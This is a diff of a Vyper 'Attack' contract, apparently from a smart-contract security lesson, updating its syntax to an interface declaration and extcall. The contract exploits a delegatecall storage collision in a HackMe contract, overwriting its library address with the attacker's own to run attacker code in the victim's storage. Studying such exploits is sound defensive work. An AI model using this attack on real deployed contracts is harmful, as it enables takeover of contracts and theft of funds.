@@ -18,25 +18,26 @@
 # Make sure the storage layout is the same as HackMe
 # This will allow us to correctly update the state variables
 
-import hack_me as HackMe
+interface HackMe:
+    def doSomething(_num: uint256): nonpayable
 
 lib: public(address)
 owner: public(address)
 someNumber: public(uint256)
 
-hackMe: public(HackMe)
+hackMe: public(address)
 
 @deploy
 def __init__(_hackMe: address):
-    self.hackMe = HackMe(_hackMe)
+    self.hackMe = _hackMe
 
 @external
 def attack():
     # override address of lib
-    self.hackMe.doSomething(convert(self, uint256))
+    extcall HackMe(self.hackMe).doSomething(convert(self, uint256))
     # pass any number as input, the function doSomething() below will
     # be called
-    self.hackMe.doSomething(1)
+    extcall HackMe(self.hackMe).doSomething(1)
 
 # function signature must match HackMe.doSomething()
 @external
